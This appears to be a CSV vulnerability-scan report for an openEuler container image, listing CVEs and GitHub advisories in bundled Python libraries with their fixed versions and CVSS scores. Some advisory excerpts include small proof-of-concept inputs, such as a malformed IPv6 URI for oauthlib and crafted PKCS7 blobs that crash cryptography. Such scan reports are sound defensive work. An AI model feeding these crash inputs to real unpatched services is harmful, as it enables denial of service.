https://harbor.archeros.cn/dev/arstack/openstack-3.0/openeuler-binary-araccel-agent:aarch64_3.0.0.65 | Image Id: eff0bfe5cccb759da7a35733edb72dbe7118412e43abd6bf1c03c9f6cfd051b1 | CVE数据库版本: 3.582 | DB创建时间: Oct 11  2024 09:24:36 | OS: openeuler:22.03
cves,description,feed_rating,fixed_version,in_base_image,last_modified_timestamp,link,name,package_name,package_version,published_timestamp,score,score_v3,severity,vectors,vectors_v3,tags
"CVE-2023-29483","Potential DoS via the Tudoor mechanism in eventlet and dnspython
eventlet before 0.35.2, as used in dnspython before 2.6.0, allows remote attackers to interfere with DNS name resolution by quickly sending an invalid packet from the expected IP address and source port, aka a 'TuDoor' attack. In other words, dnspython does not have the preferred behavior in which the DNS name resolution algorithm would proceed, within the full time window, in order to wait for a valid packet. NOTE: dnspython 2.6.0 is unusable for a different reason that was addressed in 2.6.1.
","Medium","2.6.1","false","Wed Jun 26 2024 11:31:49 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-3rq5-2g8h-59hc","CVE-2023-29483","usr/lib/python3.9/site-packages/dnspython-2.2.1-py3.9","2.2.1","Thu Apr 11 2024 23:30:48 GMT+0800 (中国标准时间)","4","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2023-29483","Potential DoS via the Tudoor mechanism in eventlet and dnspython
eventlet before 0.35.2, as used in dnspython before 2.6.0, allows remote attackers to interfere with DNS name resolution by quickly sending an invalid packet from the expected IP address and source port, aka a 'TuDoor' attack. In other words, dnspython does not have the preferred behavior in which the DNS name resolution algorithm would proceed, within the full time window, in order to wait for a valid packet. NOTE: dnspython 2.6.0 is unusable for a different reason that was addressed in 2.6.1.
","Medium","0.35.2","false","Wed Jun 26 2024 11:31:49 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-3rq5-2g8h-59hc","CVE-2023-29483","usr/lib/python3.9/site-packages/eventlet-0.33.0-py3.9","0.33.0","Thu Apr 11 2024 23:30:48 GMT+0800 (中国标准时间)","4","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2024-3651","Internationalized Domain Names in Applications (IDNA) vulnerable to denial of service from specially crafted inputs to idna.encode
### Impact
A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.

### Patches
The function has been refined to reject such strings without the associated resource consumption in version 3.7.

### Workarounds
Domain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.

### References
* https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb
","Medium","3.7","false","Wed Jul 31 2024 13:03:14 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-jjg7-2v4v-x38h","CVE-2024-3651","usr/lib/python3.9/site-packages/idna-3.2-py3.9","3.2","Fri Apr 12 2024 05:32:40 GMT+0800 (中国标准时间)","4","6.2","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2022-36087","OAuthLib vulnerable to DoS when attacker provides malicious IPV6 URI
### Impact
- Attacker providing malicious redirect uri can cause DoS to oauthlib's web application.
- Attacker can also leverage usage of `uri_validate` functions depending where it is used.

_What kind of vulnerability is it? Who is impacted?_

Oauthlib applications using OAuth2.0 provider support or use directly `uri_validate` function.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Issue fixed in 3.2.2 release.

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

The `redirect_uri` can be verified in web toolkit (i.e `bottle-oauthlib`, `django-oauth-toolkit`, ...) before oauthlib is called. A sample check if `:` is present to reject the request can prevent the DoS, assuming no port or IPv6 is fundamentally required.

### References
Attack Vector:
- Attacker providing malicious redirect uri:
https://github.com/oauthlib/oauthlib/blob/d4bafd9f1d0eba3766e933b1ac598cbbf37b8914/oauthlib/oauth2/rfc6749/grant_types/base.py#L232
- Vulnerable `uri_validate` functions:
https://github.com/oauthlib/oauthlib/blob/2b8a44855a51ad5a5b0c348a08c2564a2e197ea2/oauthlib/uri_validate.py

### PoC
```python
is_absolute_uri('http://[:::::::::::::::::::::::::::::::::::::::]/path')
```

### Acknowledgement
Special thanks to Sebastian Chnelik - PyUp.io
","Medium","3.2.2","false","Tue Oct 08 2024 00:52:34 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-3pgj-pg6c-r5p7","CVE-2022-36087","usr/lib/python3.9/site-packages/oauthlib-3.1.1-py3.9","3.1.1","Sat Sep 17 2022 05:02:52 GMT+0800 (中国标准时间)","4","5.7","Medium","","CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H",""
"CVE-2023-48795","Prefix Truncation Attack against ChaCha20-Poly1305 and Encrypt-then-MAC aka Terrapin
### Summary

Terrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.

### Mitigations

To mitigate this protocol vulnerability, OpenSSH suggested a so-called 'strict kex' which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.

**Warning: To take effect, both the client and server must support this countermeasure.** 

As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.

### Details

The SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.

The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.

In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.

For more details see [https://terrapin-attack.com](https://terrapin-attack.com). 

### Impact

This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.
","Medium","3.4.0","false","Thu May 02 2024 21:18:40 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-45x7-px36-x8w8","CVE-2023-48795","usr/lib/python3.9/site-packages/paramiko-2.11.0-py3.9","2.11.0","Tue Dec 19 2023 03:22:09 GMT+0800 (中国标准时间)","4","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",""
"CVE-2024-35195","Requests `Session` object does not verify requests after making first request with verify=False
When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.

### Remediation
Any of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.

* Upgrade to `requests>=2.32.0`.
* For `requests<2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session.
* For `requests<2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.

### Related Links
* https://github.com/psf/requests/pull/6655
","Medium","2.32.0","false","Tue Jun 11 2024 02:31:04 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-9wx4-h78v-vm56","CVE-2024-35195","usr/lib/python3.9/site-packages/requests-2.26.0-py3.9","2.26.0","Tue May 21 2024 04:15:00 GMT+0800 (中国标准时间)","4","5.6","Medium","","CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N",""
"CVE-2023-32681","Unintended leak of Proxy-Authorization header in requests
### Impact

Since Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).

**Current vulnerable behavior(s):**

1. HTTP → HTTPS: **leak**
2. HTTPS → HTTP: **no leak**
3. HTTPS → HTTPS: **leak**
4. HTTP → HTTP: **no leak**

For HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.

The reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.

### Patches
Starting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3's ProxyManager.

For users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn't make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.

### Workarounds
For users who are not able to update Requests immediately, there is one potential workaround.

You may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you're currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.
```
import requests
r = requests.get('http://github.com/', allow_redirects=False)
```

### Credits

This vulnerability was discovered and disclosed by the following individuals.

Dennis Brinkrolf, Haxolot (https://haxolot.com/)
Tobias Funke, (tobiasfunke93@gmail.com)
","Medium","2.31.0","false","Thu Mar 28 2024 04:09:55 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-j8r2-6x86-q33q","CVE-2023-32681","usr/lib/python3.9/site-packages/requests-2.26.0-py3.9","2.26.0","Tue May 23 2023 04:36:32 GMT+0800 (中国标准时间)","4","6.1","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N",""
"CVE-2023-30608","sqlparse contains a regular expression that is vulnerable to Regular Expression Denial of Service
### Impact
The SQL parser contains a regular expression that is vulnerable to [ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) (Regular Expression Denial of Service). The vulnerability may lead to Denial of Service (DoS).

### Patches
This issues has been fixed in sqlparse 0.4.4.

### Workarounds
None. 

### References
This issue was discovered and reported by GHSL team member [@erik-krogh (Erik Krogh Kristensen)](https://github.com/erik-krogh).
- Commit that introduced the vulnerability: e75e35869473832a1eb67772b1adfee2db11b85a

","Medium","0.4.4","false","Sat Nov 11 2023 13:06:31 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-rrm6-wvj7-cwh2","CVE-2023-30608","usr/lib/python3.9/site-packages/sqlparse-0.4.2-py3.9","0.4.2","Sat Apr 22 2023 04:24:21 GMT+0800 (中国标准时间)","4","5.5","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",""
"CVE-2023-43804","`Cookie` HTTP header isn't stripped on cross-origin redirects
urllib3 doesn't treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn't disable redirects explicitly.

Users **must** handle redirects themselves instead of relying on urllib3's automatic redirects to achieve safe processing of the `Cookie` header, thus we decided to strip the header by default in order to further protect users who aren't using the correct approach.

## Affected usages

We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:

* Using an affected version of urllib3 (patched in v1.26.17 and v2.0.6)
* Using the `Cookie` header on requests, which is mostly typical for impersonating a browser.
* Not disabling HTTP redirects
* Either not using HTTPS or for the origin server to redirect to a malicious origin.

## Remediation

* Upgrading to at least urllib3 v1.26.17 or v2.0.6
* Disabling HTTP redirects using `redirects=False` when sending requests.
* Not using the `Cookie` header.
","Medium","2.0.6;1.26.17","false","Sat Nov 04 2023 08:30:22 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-v845-jxx5-vc9f","CVE-2023-43804","usr/lib/python3.9/site-packages/urllib3-1.26.12-py3.9","1.26.12","Tue Oct 03 2023 07:27:05 GMT+0800 (中国标准时间)","4","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N",""
"CVE-2023-45803","urllib3's request body not stripped after redirect from 303 status changes request method to GET
urllib3 previously wouldn't remove the HTTP request body when an HTTP redirect response using status 303 'See Other' after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although the behavior of removing the request body is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers.

From [RFC 9110 Section 9.3.1](https://www.rfc-editor.org/rfc/rfc9110.html#name-get):

> A client SHOULD NOT generate content in a GET request unless it is made directly to an origin server that has previously indicated, in or out of band, that such a request has a purpose and will be adequately supported.

## Affected usages

Because the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable.

Both of the following conditions must be true to be affected by this vulnerability:

* If you're using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON)
* The origin service is compromised and starts redirecting using 303 to a malicious peer or the redirected-to service becomes compromised.

## Remediation

You can remediate this vulnerability with any of the following steps:

* Upgrade to a patched version of urllib3 (v1.26.18 or v2.0.7)
* Disable redirects for services that you aren't expecting to respond with redirects with `redirects=False`.
* Disable automatic redirects with `redirects=False` and handle 303 redirects manually by stripping the HTTP request body.

","Medium","2.0.7;1.26.18","false","Tue Nov 07 2023 00:24:46 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-g4mx-q9vg-27p4","CVE-2023-45803","usr/lib/python3.9/site-packages/urllib3-1.26.12-py3.9","1.26.12","Wed Oct 18 2023 04:15:25 GMT+0800 (中国标准时间)","4","4.2","Medium","","CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N",""
"CVE-2024-37891","urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects 
When using urllib3's proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.

However, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.

Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.

Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.

## Affected usages

We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:

* Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support.
* Not disabling HTTP redirects.
* Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.

## Remediation

* Using the `Proxy-Authorization` header with urllib3's `ProxyManager`.
* Disabling HTTP redirects using `redirects=False` when sending requests.
* Not using the `Proxy-Authorization` header.
","Medium","1.26.19;2.2.2","false","Tue Jun 18 2024 05:37:23 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-34jh-p97f-mpxf","CVE-2024-37891","usr/lib/python3.9/site-packages/urllib3-1.26.12-py3.9","1.26.12","Tue Jun 18 2024 05:37:20 GMT+0800 (中国标准时间)","4","4.4","Medium","","CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N",""
"CVE-2024-5569","zipp Denial of Service vulnerability
A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the `Path` module in both zipp and zipfile, such as `joinpath`, the overloaded division operator, and `iterdir`. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp.
","Medium","3.19.1","false","Thu Aug 08 2024 13:06:36 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-jfmj-5v4g-7637","CVE-2024-5569","usr/lib/python3.9/site-packages/zipp-3.7.0-py3.9","3.7.0","Tue Jul 09 2024 08:31:40 GMT+0800 (中国标准时间)","4","6.2","Medium","","CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2023-23931","Cipher.update_into can corrupt memory if passed an immutable python object as the outbuf
Previously, `Cipher.update_into` would accept Python objects which implement the buffer protocol, but provide only immutable buffers:

```pycon
>>> outbuf = b'\x00' * 32
>>> c = ciphers.Cipher(AES(b'\x00' * 32), modes.ECB()).encryptor()
>>> c.update_into(b'\x00' * 16, outbuf)
16
>>> outbuf
b'\xdc\x95\xc0x\xa2@\x89\x89\xadH\xa2\x14\x92\x84 \x87\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

This would allow immutable objects (such as `bytes`) to be mutated, thus violating fundamental rules of Python. This is a soundness bug -- it allows programmers to misuse an API, it cannot be exploited by attacker controlled data alone.

This now correctly raises an exception.

This issue has been present since `update_into` was originally introduced in cryptography 1.8.
","Medium","39.0.1","false","Sat Sep 14 2024 04:07:53 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-w7pp-m8wf-vj6r","CVE-2023-23931","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Wed Feb 08 2023 04:54:10 GMT+0800 (中国标准时间)","4","6.5","Medium","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",""
"CVE-2023-49083","cryptography vulnerable to NULL-dereference when loading PKCS7 certificates
### Summary

Calling `load_pem_pkcs7_certificates` or `load_der_pkcs7_certificates` could lead to a NULL-pointer dereference and segfault.

### PoC
Here is a Python code that triggers the issue:
```python
from cryptography.hazmat.primitives.serialization.pkcs7 import load_der_pkcs7_certificates, load_pem_pkcs7_certificates

pem_p7 = b'''
-----BEGIN PKCS7-----
MAsGCSqGSIb3DQEHAg==
-----END PKCS7-----
'''

der_p7 = b'\x30\x0B\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x07\x02'

load_pem_pkcs7_certificates(pem_p7)
load_der_pkcs7_certificates(der_p7)
```

### Impact
Exploitation of this vulnerability poses a serious risk of Denial of Service (DoS) for any application attempting to deserialize a PKCS7 blob/certificate. The consequences extend to potential disruptions in system availability and stability.
","Medium","41.0.6","false","Wed Feb 21 2024 02:14:36 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-jfhm-5ghh-2f97","CVE-2023-49083","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Wed Nov 29 2023 04:46:46 GMT+0800 (中国标准时间)","4","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2024-0727","Null pointer dereference in PKCS12 parsing
Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL
to crash leading to a potential Denial of Service attack

Impact summary: Applications loading files in the PKCS12 format from untrusted
sources might terminate abruptly.

A file in PKCS12 format can contain certificates and keys and may come from an
untrusted source. The PKCS12 specification allows certain fields to be NULL, but
OpenSSL does not correctly check for this case. This can lead to a NULL pointer
dereference that results in OpenSSL crashing. If an application processes PKCS12
files from an untrusted source using the OpenSSL APIs then that application will
be vulnerable to this issue.

OpenSSL APIs that are vulnerable to this are: PKCS12_parse(),
PKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()
and PKCS12_newpass().

We have also fixed a similar issue in SMIME_write_PKCS7(). However since this
function is related to writing data we do not consider it security significant.

The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.
","Medium","42.0.2","false","Sun May 12 2024 13:03:47 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-9v9h-cgj8-h64p","CVE-2024-0727","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Fri Jan 26 2024 17:30:23 GMT+0800 (中国标准时间)","4","5.5","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",""
"CVE-2023-32732","gRPC connection termination issue
gRPC contains a vulnerability whereby a client can cause a termination of connection between a HTTP2 proxy and a gRPC server: a base64 encoding error for `-bin` suffixed headers will result in a disconnection by the gRPC server, but is typically allowed by HTTP2 proxies. We recommend upgrading beyond the commit in https://github.com/grpc/grpc/pull/32309.

","Medium","1.53.0","false","Sat Nov 11 2023 13:06:16 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-9hxf-ppjv-w6rq","CVE-2023-32732","usr/lib64/python3.9/site-packages/grpcio-1.41.1-py3.9","1.41.1","Fri Jul 07 2023 05:15:08 GMT+0800 (中国标准时间)","4","5.3","Medium","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",""
"CVE-2022-2309","lxml NULL Pointer Dereference allows attackers to cause a denial of service
NULL Pointer Dereference allows attackers to cause a denial of service (or application crash). This only applies when lxml is used together with libxml2 2.9.10 through 2.9.14. libxml2 2.9.9 and earlier are not affected. It allows triggering crashes through forged input data, given a vulnerable code sequence in the application. The vulnerability is caused by the iterwalk function (also used by the canonicalize function). Such code shouldn't be in wide-spread use, given that parsing + iterwalk would usually be replaced with the more efficient iterparse function. However, an XML converter that serialises to C14N would also be vulnerable, for example, and there are legitimate use cases for this code sequence. If untrusted input is received (also remotely) and processed via iterwalk function, a crash can be triggered.
","Medium","4.9.1","false","Tue Oct 01 2024 04:19:36 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-wrxv-2j5q-m38w","CVE-2022-2309","usr/lib64/python3.9/site-packages/lxml-4.7.1-py3.9","4.7.1","Wed Jul 06 2022 08:00:30 GMT+0800 (中国标准时间)","5","5.3","Medium","","CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",""
"","PyMongo Out-of-bounds Read in the bson module 
Versions of the package pymongo before 4.6.3 are vulnerable to Out-of-bounds Read in the bson module. Using the crafted payload the attacker could force the parser to deserialize unmanaged memory. The parser tries to interpret bytes next to buffer and throws an exception with string. If the following bytes are not printable UTF-8 the parser throws an exception with a single byte.

This advisory was initially published as CVE-2024-21506, which has since been rejected as a duplicate of CVE-2024-5629.
","Medium","4.6.3","false","Thu Jun 06 2024 01:12:00 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-cr6f-gf5w-vhrc","GHSA-cr6f-gf5w-vhrc","usr/lib64/python3.9/site-packages/pymongo-3.11.3-py3.9","3.11.3","Sat Apr 06 2024 14:31:08 GMT+0800 (中国标准时间)","4","5.2","Medium","","CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:L",""
"CVE-2024-5629","PyMongo Out-of-bounds Read in the bson module 
Versions of the package pymongo before 4.6.3 are vulnerable to Out-of-bounds Read in the bson module. Using the crafted payload the attacker could force the parser to deserialize unmanaged memory. The parser tries to interpret bytes next to buffer and throws an exception with string. If the following bytes are not printable UTF-8 the parser throws an exception with a single byte.
","Medium","4.6.3","false","Wed Jun 19 2024 03:15:24 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-m87m-mmvp-v9qm","CVE-2024-5629","usr/lib64/python3.9/site-packages/pymongo-3.11.3-py3.9","3.11.3","Wed Jun 05 2024 23:30:39 GMT+0800 (中国标准时间)","4","4.7","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:L",""
"","Tornado vulnerable to HTTP request smuggling via improper parsing of `Content-Length` fields and chunk lengths
## Summary
Tornado interprets `-`, `+`, and `_` in chunk length and `Content-Length` values, which are not allowed by the HTTP RFCs. This can result in request smuggling when Tornado is deployed behind certain proxies that interpret those non-standard characters differently. This is known to apply to older versions of haproxy, although the current release is not affected.

## Details
Tornado uses the `int` constructor to parse the values of `Content-Length` headers and chunk lengths in the following locations:
### `tornado/http1connection.py:445`
```python3
            self._expected_content_remaining = int(headers['Content-Length'])
```
### `tornado/http1connection.py:621`
```python3
                content_length = int(headers['Content-Length'])  # type: Optional[int]
```
### `tornado/http1connection.py:671`
```python3
            chunk_len = int(chunk_len_str.strip(), 16)
```
Because `int('0_0') == int('+0') == int('-0') == int('0')`, using the `int` constructor to parse and validate strings that should contain only ASCII digits is not a good strategy. 


","Medium","6.3.3","false","Fri Sep 08 2023 04:25:28 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-qppv-j76h-2rpx","GHSA-qppv-j76h-2rpx","usr/lib64/python3.9/site-packages/tornado-6.1-py3.9","6.1","Tue Aug 15 2023 05:34:17 GMT+0800 (中国标准时间)","4","4","Medium","","",""
